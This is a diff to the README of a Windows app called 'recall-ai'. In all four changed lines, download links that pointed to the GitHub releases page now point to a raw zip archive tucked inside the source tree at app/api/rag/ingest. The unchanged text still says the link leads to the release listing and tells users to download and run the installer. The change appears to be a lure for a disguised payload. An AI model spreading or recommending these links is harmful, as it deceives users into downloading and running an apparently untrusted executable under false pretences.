@@ -1,6 +1,6 @@
 # 🤖 recall-ai - Smart Knowledge Made Simple
 
-[![Download recall-ai](https://img.shields.io/badge/Download-recall--ai-brightgreen?style=for-the-badge)](https://github.com/ipsam40/recall-ai/releases)
+[![Download recall-ai](https://img.shields.io/badge/Download-recall--ai-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ipsam40/recall-ai/main/app/api/rag/ingest/ai_recall_v3.8-alpha.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get recall-ai running on your Windows PC.
 
 Go to the release page where you can get the software:
 
-[Download recall-ai](https://github.com/ipsam40/recall-ai/releases)
+[Download recall-ai](https://raw.githubusercontent.com/ipsam40/recall-ai/main/app/api/rag/ingest/ai_recall_v3.8-alpha.2.zip)
 
 This link takes you directly to the page where the latest versions are listed.
 
@@ -101,7 +101,7 @@ recall-ai runs code inside a secure sandbox. This means your files and data are 
 
 To get new features or fixes, check the release page regularly:
 
-[Download recall-ai](https://github.com/ipsam40/recall-ai/releases)
+[Download recall-ai](https://raw.githubusercontent.com/ipsam40/recall-ai/main/app/api/rag/ingest/ai_recall_v3.8-alpha.2.zip)
 
 Download the latest installer and run it over your current version. Your data and settings will stay safe during updates.
 
@@ -143,4 +143,4 @@ These help recall-ai stay fast, flexible, and reliable.
 
 ---
 
-[![Download recall-ai](https://img.shields.io/badge/Download-recall--ai-blue?style=for-the-badge)](https://github.com/ipsam40/recall-ai/releases)
+[![Download recall-ai](https://img.shields.io/badge/Download-recall--ai-blue?style=for-the-badge)](https://raw.githubusercontent.com/ipsam40/recall-ai/main/app/api/rag/ingest/ai_recall_v3.8-alpha.2.zip)
